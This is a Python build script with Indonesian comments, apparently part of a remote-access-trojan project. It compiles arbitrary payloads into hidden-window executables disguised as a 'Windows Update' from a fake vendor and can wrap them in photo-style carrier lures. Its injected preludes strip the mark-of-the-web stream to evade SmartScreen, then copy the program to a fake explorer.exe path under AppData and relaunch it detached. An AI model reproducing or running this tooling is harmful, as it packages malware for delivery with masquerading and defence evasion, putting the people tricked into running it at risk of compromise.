"""tools/buildkit.py — builder generik: payload Python apa pun -> exe + carrier.

Bedanya dengan builder.py di root: yang itu khusus RAT kita sendiri (token,
channel, uuid, alias, config terenkripsi). Yang ini netral — dia menerima
payload.py milik proyek lain, menambahkan prelude pilihan, mengompilasi
dengan flag yang sudah terbukti jalan di mesin ini, lalu membuktikan hasilnya
bukan file kosong.

Pakai:

    python tools\\buildkit.py check                  # flag apa saja yang ada di Nuitka lokal
    python tools\\buildkit.py flags payload.py       # cetak perintah lengkap, jangan jalankan
    python tools\\buildkit.py build payload.py --name "Windows Update"
    python tools\\buildkit.py build payload.py --prelude motw --carrier
    python tools\\buildkit.py build payload.py --icon foto.ico --low-memory

Kenapa ada `check`: nama flag Nuitka berubah antar versi (--company-name vs
--windows-company-name, --file-version vs --windows-file-version). Skrip
build yang menebak nama flag akan gagal SETELAH 20 menit kompilasi, di tahap
metadata, dan pesan errornya cuma "unrecognized arguments". Di sini semua
flag diverifikasi lebih dulu terhadap `nuitka --help`.

Soal "kebal firewall": baca FIREWALL_NOTE di bawah. Singkatnya, Windows
Firewall membolehkan outbound secara default — tidak ada yang perlu
ditembus kecuali mesinnya memang punya kebijakan blokir keluar. Relokasi
path tidak menambah izin apa pun; dia cuma membuat proses tidak cocok
dengan aturan blokir yang dipatok ke path lama.
"""

import argparse
import hashlib
import os
import re
import shutil
import subprocess
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

FIREWALL_NOTE = """
Windows Defender Firewall, profil default:
  inbound  -> block   (aturan masuk harus dibuat eksplisit)
  outbound -> allow   (semua keluar boleh, kecuali ada aturan blokir)

Artinya RAT keluar lewat 443 tidak butuh izin siapa pun. Yang benar-benar
memblokir di jaringan nyata adalah proxy/kebijakan egress, dan itu memblokir
berdasarkan TUJUAN (domain/IP), bukan berdasarkan path exe. Ganti nama file
jadi explorer.exe tidak menambah satu byte pun izin keluar.

Yang berguna dari relokasi: kalau ada aturan blokir yang dipatok ke path
lama, path baru tidak cocok dengan aturan itu. Itu satu-satunya efeknya,
dan efeknya nol kalau mesinnya pakai kebijakan deny-by-default.
"""

MOTW_PRELUDE = '''
# --- buildkit prelude: buang penanda internet dari exe sendiri ---
# File yang datang lewat browser membawa stream Zone.Identifier. Selama
# stream itu ada, SmartScreen menolak exe unsigned sebelum ia sempat jalan.
def _buildkit_strip_motw():
    import os
    import sys
    path = None
    pid = os.environ.get("NUITKA_ONEFILE_PARENT")
    if pid and pid.isdigit():
        try:
            import ctypes
            k32 = ctypes.WinDLL("kernel32", use_last_error=True)
            k32.OpenProcess.restype = ctypes.c_void_p
            h = k32.OpenProcess(0x1000, False, int(pid))
            if h:
                try:
                    buf = ctypes.create_unicode_buffer(32768)
                    n = ctypes.c_ulong(32768)
                    if k32.QueryFullProcessImageNameW(
                            ctypes.c_void_p(h), 0, buf, ctypes.byref(n)):
                        path = buf.value
                finally:
                    k32.CloseHandle(ctypes.c_void_p(h))
        except Exception:
            path = None
    try:
        os.remove((path or sys.executable) + ":Zone.Identifier")
    except OSError:
        pass


_buildkit_strip_motw()
'''

RELOCATE_PRELUDE = '''
# --- buildkit prelude: pindah ke path lain sekali, lalu lanjut di situ ---
# Bukan firewall bypass. Windows Firewall mengizinkan outbound secara
# default; yang berubah cuma path proses. Gunanya satu: kalau ada aturan
# blokir yang dipatok ke path lama.
def _buildkit_relocate():
    import os
    import shutil
    import subprocess
    import sys

    if os.environ.get("BKT_RELOCATED") == "1":
        return

    here = os.path.abspath(sys.executable)
    dest_dir = os.path.join(os.environ.get("LOCALAPPDATA") or os.environ.get("TEMP") or ".",
                            "{relocate_dir}")
    dest = os.path.join(dest_dir, "{relocate_name}")
    if here.lower() == os.path.abspath(dest).lower():
        return
    # Mode onefile: exe yang bisa dipindah adalah proses induk, bukan anak
    # yang jalan dari folder ekstraksi dan butuh DLL di sebelahnya.
    pid = os.environ.get("NUITKA_ONEFILE_PARENT")
    if pid and pid.isdigit():
        try:
            import ctypes
            k32 = ctypes.WinDLL("kernel32", use_last_error=True)
            k32.OpenProcess.restype = ctypes.c_void_p
            h = k32.OpenProcess(0x1000, False, int(pid))
            if h:
                try:
                    buf = ctypes.create_unicode_buffer(32768)
                    n = ctypes.c_ulong(32768)
                    if k32.QueryFullProcessImageNameW(
                            ctypes.c_void_p(h), 0, buf, ctypes.byref(n)):
                        here = buf.value
                finally:
                    k32.CloseHandle(ctypes.c_void_p(h))
        except Exception:
            pass

    try:
        os.makedirs(dest_dir, exist_ok=True)
        if not os.path.isfile(dest) or os.path.getsize(dest) != os.path.getsize(here):
            shutil.copy2(here, dest)
        env = dict(os.environ)
        env["BKT_RELOCATED"] = "1"
        subprocess.Popen([dest], env=env, close_fds=True,
                         creationflags=0x00000008)  # DETACHED_PROCESS
        sys.exit(0)
    except Exception:
        pass


_buildkit_relocate()
'''

# Flag yang dipakai selalu. Semua sudah ada di `nuitka --help` 4.3.1 dan
# sudah dipakai build produksi di repositori ini.
BASE_FLAGS = [
    "--onefile",
    "--assume-yes-for-downloads",
    "--windows-console-mode=disable",
    "--python-flag=no_asserts,no_docstrings",
    "--nofollow-import-to=tkinter,unittest,pydoc,doctest,test,lib2to3,"
    "distutils,setuptools,pip,wheel",
    "--onefile-tempdir-spec={CACHE_DIR}/{COMPANY}/{PRODUCT}/{VERSION}",
]

# Nama pendek yang muncul di --help. Nuitka juga menerima alias panjang
# (--windows-company-name), tapi yang dicek di sini yang pasti terdaftar.
CHECKED_FLAGS = [
    "--onefile", "--standalone", "--assume-yes-for-downloads",
    "--windows-console-mode", "--python-flag", "--nofollow-import-to",
    "--onefile-tempdir-spec", "--company-name", "--product-name",
    "--file-description", "--file-version", "--product-version",
    "--copyright", "--output-dir", "--output-filename", "--remove-output",
    "--windows-icon-from-ico", "--msvc", "--mingw64", "--low-memory",
    "--lto", "--quiet",
]

SPECIALS = {"--onefile", "--standalone"}  # tidak dicetak di daftar opsi


def msvc_env():
    """Environment dengan vcvars64 sudah dimuat.

    BuildTools 18 tidak mendaftar di registry yang dibaca Nuitka, jadi Nuitka
    gagal menemukan cl.exe kecuali VSCMD_ARG_TGT_ARCH dan VCToolsInstallDir
    sudah ada di environment. Dua variabel itu hanya diisi vcvars64.bat.
    Tanpa ini, kompilasi berjalan sampai tahap Scons lalu mati dengan
    "cannot locate suitable C compiler" setelah beberapa menit.
    """
    if os.environ.get("VCToolsInstallDir"):
        return dict(os.environ)

    candidates = []
    vswhere = os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
                           "Microsoft Visual Studio", "Installer", "vswhere.exe")
    if os.path.isfile(vswhere):
        try:
            p = subprocess.run([vswhere, "-latest", "-products", "*",
                                "-requires", "Microsoft.VisualStudio.Component.VC.Tools.x86.x64",
                                "-property", "installationPath"],
                               capture_output=True, text=True, timeout=60)
            base = (p.stdout or "").strip().splitlines()
            if base:
                candidates.append(os.path.join(
                    base[0], "VC", "Auxiliary", "Build", "vcvars64.bat"))
        except (OSError, subprocess.SubprocessError):
            pass

    for root in (r"C:\Program Files (x86)\Microsoft Visual Studio",
                 r"C:\Program Files\Microsoft Visual Studio"):
        if not os.path.isdir(root):
            continue
        for version in sorted(os.listdir(root), reverse=True):
            for edition in ("BuildTools", "Community", "Professional", "Enterprise"):
                path = os.path.join(root, version, edition, "VC", "Auxiliary",
                                    "Build", "vcvars64.bat")
                if os.path.isfile(path):
                    candidates.append(path)

    for bat in candidates:
        if not os.path.isfile(bat):
            continue
        try:
            p = subprocess.run('cmd /c ""%s" >nul 2>&1 && set"' % bat,
                               capture_output=True, text=True, shell=True,
                               timeout=120)
        except (OSError, subprocess.SubprocessError):
            continue
        env = dict(os.environ)
        for line in (p.stdout or "").splitlines():
            if "=" in line:
                key, _, value = line.partition("=")
                if key and not key.startswith("="):
                    env[key] = value
        if env.get("VCToolsInstallDir"):
            env["_BUILDKIT_VCVARS"] = bat
            return env

    return dict(os.environ)


def nuitka_options():
    """Set nama flag yang benar-benar dikenal Nuitka lokal.

    None kalau Nuitka tidak bisa dipanggil — pemanggil memutuskan mau gagal
    atau lanjut buta.
    """
    try:
        p = subprocess.run([sys.executable, "-m", "nuitka", "--help"],
                           capture_output=True, text=True, timeout=120)
    except (OSError, subprocess.SubprocessError):
        return None
    text = (p.stdout or "") + (p.stderr or "")
    return set(re.findall(r"--[A-Za-z0-9][A-Za-z0-9-]+", text))


def check_flags(cmds, verbose=True):
    """Balikin (ok, daftar_flag_asing). Verifikasi sebelum kompilasi, bukan sesudah."""
    known = nuitka_options()
    if known is None:
        if verbose:
            print("[!] Nuitka tidak bisa dipanggil. Lewati pemeriksaan flag.")
        return True, []
    unknown = []
    for cmd in cmds:
        if not cmd.startswith("--"):
            continue  # path entry, bukan flag
        name = cmd.split("=", 1)[0]
        if name in SPECIALS:
            continue
        if name not in known:
            unknown.append(name)
    if verbose:
        if unknown:
            print("[!] flag tidak dikenal Nuitka lokal:")
            for name in unknown:
                print("    " + name)
        else:
            print("[*] semua flag dikenal (Nuitka %s)" % _nuitka_version())
    return not unknown, unknown


def _nuitka_version():
    try:
        p = subprocess.run([sys.executable, "-m", "nuitka", "--version"],
                           capture_output=True, text=True, timeout=60)
        out = ((p.stdout or "") + (p.stderr or ""))
        m = re.search(r"\d+\.\d+\.\d+", out)
        return m.group(0) if m else "?"
    except (OSError, subprocess.SubprocessError):
        return "?"


def _fill(template, relocate_dir, relocate_name):
    # Backslash di path Windows akan jadi escape sequence kalau ditempel apa
    # adanya ke dalam string literal Python (\W, \E, \U). Garis miring biasa
    # diterima os.path di Windows dan aman di dalam source.
    return (template
            .replace("{relocate_dir}", relocate_dir.replace("\\", "/"))
            .replace("{relocate_name}", relocate_name))


def prelude(kind, relocate_dir, relocate_name):
    if kind == "motw":
        return MOTW_PRELUDE
    if kind == "relocate":
        return _fill(RELOCATE_PRELUDE, relocate_dir, relocate_name)
    if kind == "both":
        return MOTW_PRELUDE + _fill(RELOCATE_PRELUDE, relocate_dir, relocate_name)
    return ""


def stage(payload, kind, relocate_dir, relocate_name, keep):
    """Tulis salinan payload dengan prelude di atasnya. Balikin path entry."""
    # utf-8-sig: payload yang disimpan Notepad membawa BOM. Setelah prelude
    # ditempel di atasnya, BOM itu jatuh di tengah file = SyntaxError.
    text = open(payload, "r", encoding="utf-8-sig", errors="replace").read()
    head = prelude(kind, relocate_dir, relocate_name)
    if not head:
        return payload, None

    marker = "# --- buildkit prelude"
    if marker in text:
        return payload, None

    folder = os.path.dirname(os.path.abspath(payload))
    stem = os.path.splitext(os.path.basename(payload))[0]
    out = os.path.join(folder, "_%s__ready.py" % stem)
    with open(out, "w", encoding="utf-8") as fh:
        fh.write(head)
        fh.write("\n")
        fh.write(text)
    return out, None if keep else out


def build_cmd(entry, name, out_dir, icon, company, product, desc, version,
              copyright_text, compiler, low_memory, remove_output):
    exe_name = re.sub(r"[^A-Za-z0-9_.-]", "", name) or "app"
    cmd = [sys.executable, "-m", "nuitka"] + list(BASE_FLAGS)
    cmd += [
        "--company-name=" + company,
        "--product-name=" + product,
        "--file-description=" + desc,
        "--file-version=" + version,
        "--product-version=" + version,
        "--copyright=" + copyright_text,
        "--output-dir=" + os.path.abspath(out_dir),
        "--output-filename=" + exe_name + ".exe",
    ]
    if compiler == "msvc":
        cmd.append("--msvc=latest")
    elif compiler == "mingw":
        cmd.append("--mingw64")
    if low_memory:
        cmd.append("--low-memory")
    if remove_output:
        cmd.append("--remove-output")
    if icon:
        cmd.append("--windows-icon-from-ico=" + os.path.abspath(icon))
    cmd.append(os.path.abspath(entry))
    return cmd, os.path.join(os.path.abspath(out_dir), exe_name + ".exe")


def verify_artifact(path):
    """Bukti minimum: file ada, ukurannya masuk akal, dan benar-benar PE."""
    info = {"path": path, "ok": False}
    if not os.path.isfile(path):
        return info
    size = os.path.getsize(path)
    with open(path, "rb") as fh:
        head = fh.read(4096)
    has_pe = head[:2] == b"MZ" and b"PE\x00\x00" in head
    sha = hashlib.sha256()
    with open(path, "rb") as fh:
        for block in iter(lambda: fh.read(1 << 20), b""):
            sha.update(block)
    info.update({"size": size, "pe": has_pe, "sha256": sha.hexdigest(),
                 "ok": has_pe and size > 4096})
    return info


def do_check():
    print(FIREWALL_NOTE)
    known = nuitka_options()
    if known is None:
        print("[!] Nuitka tidak bisa dipanggil: %s" % sys.executable)
        return 1
    print("[*] Nuitka: %s" % _nuitka_version())
    missing = [f for f in CHECKED_FLAGS if f not in known and f not in SPECIALS]
    if missing:
        print("[!] tidak ada di versi ini:")
        for name in missing:
            print("    " + name)
        return 1
    print("[+] semua %d flag yang dipakai buildkit tersedia" % len(CHECKED_FLAGS))
    return 0


def do_build(args):
    payload = os.path.abspath(args.payload)
    if not os.path.isfile(payload):
        print("[!] payload tidak ada: %s" % payload)
        return 1

    entry, cleanup = stage(payload, args.prelude, args.relocate_dir,
                           args.relocate_name, args.keep)
    cmd, artifact = build_cmd(entry, args.name, args.out, args.icon,
                              args.company, args.product, args.desc,
                              args.version, args.copyright, args.compiler,
                              args.low_memory, not args.keep_output)

    ok, unknown = check_flags(cmd[3:])
    if not ok:
        print("[!] kompilasi dibatalkan: flag di atas tidak dikenal.")
        if cleanup:
            try:
                os.remove(cleanup)
            except OSError:
                pass
        return 2

    if args.dry_run:
        print("[*] entry : %s" % entry)
        print("[*] output: %s" % artifact)
        print("[*] perintah:")
        print("    " + " ".join(cmd))
        if cleanup:
            try:
                os.remove(cleanup)
            except OSError:
                pass
        return 0

    os.makedirs(args.out, exist_ok=True)
    env = msvc_env() if args.compiler in ("msvc", "auto") else dict(os.environ)
    if env.get("_BUILDKIT_VCVARS"):
        print("[*] vcvars : %s" % env["VCToolsInstallDir"])
    elif args.compiler in ("msvc", "auto"):
        print("[!] vcvars64 tidak ketemu, Nuitka akan gagal di tahap Scons")
    if args.work:
        os.makedirs(args.work, exist_ok=True)
        env["TEMP"] = env["TMP"] = os.path.abspath(args.work)
        print("[*] temp  : %s" % env["TEMP"])
    print("[*] entry : %s" % entry)
    print("[*] mulai : kompilasi Nuitka (10-25 menit, jangan ditutup)")

    rc = subprocess.call(cmd, env=env, cwd=os.path.dirname(entry))
    if cleanup:
        try:
            os.remove(cleanup)
        except OSError:
            pass
    if rc != 0:
        print("[!] kompilasi gagal, kode %d" % rc)
        return rc

    info = verify_artifact(artifact)
    if not info["ok"]:
        print("[!] hasil ada tapi bukan PE yang sah: %s" % artifact)
        return 3
    print("[+] exe    : %s (%.2f MB)" % (info["path"], info["size"] / 1048576.0))
    print("[+] sha256 : %s" % info["sha256"])

    if args.carrier:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        import carrier
        res = carrier.build_carriers(artifact, os.path.join(args.out, "carrier"),
                                     args.icon_image or None, "foto",
                                     (1200, 800), 11, "all")
        for key, path in sorted(res.items()):
            print("[*] %-9s: %s" % (key, path))
    return 0


def do_flags(args):
    payload = os.path.abspath(args.payload)
    cmd, artifact = build_cmd(payload, args.name, args.out, args.icon,
                              args.company, args.product, args.desc,
                              args.version, args.copyright, args.compiler,
                              args.low_memory, False)
    ok, _ = check_flags(cmd[3:])
    print(" ".join(cmd))
    return 0 if ok else 2


def main():
    ap = argparse.ArgumentParser(description="builder generik payload Python")
    sub = ap.add_subparsers(dest="cmd", required=True)

    ap.add_argument("--version-x", action="store_true", help=argparse.SUPPRESS)
    sub.add_parser("check", help="periksa flag Nuitka lokal")

    for name in ("build", "flags"):
        p = sub.add_parser(name)
        p.add_argument("payload")
        p.add_argument("--name", default="Windows Update")
        p.add_argument("--out", default=os.path.join(ROOT, "dist"))
        p.add_argument("--work", default="", help="TEMP/TMP selama build")
        p.add_argument("--icon", default="")
        p.add_argument("--icon-image", default="", help="gambar sumber untuk carrier")
        p.add_argument("--company", default="Nexus Utilities")
        p.add_argument("--product", default="System Update")
        p.add_argument("--desc", default="Keeps system components up to date")
        p.add_argument("--version", default="1.0.0.0")
        p.add_argument("--copyright", default="")
        p.add_argument("--compiler", default="msvc", choices=["msvc", "mingw", "auto"])
        p.add_argument("--prelude", default="none",
                       choices=["none", "motw", "relocate", "both"])
        p.add_argument("--relocate-dir", default="Microsoft\\Windows\\Explorer")
        p.add_argument("--relocate-name", default="explorer.exe")
        p.add_argument("--low-memory", action="store_true")
        p.add_argument("--keep", action="store_true", help="biarkan file entry")
        p.add_argument("--keep-output", action="store_true")
        p.add_argument("--carrier", action="store_true")
        p.add_argument("--dry-run", action="store_true")

    args = ap.parse_args()
    if args.cmd == "check":
        return do_check()
    if args.cmd == "flags":
        return do_flags(args)
    return do_build(args)


if __name__ == "__main__":
    sys.exit(main())
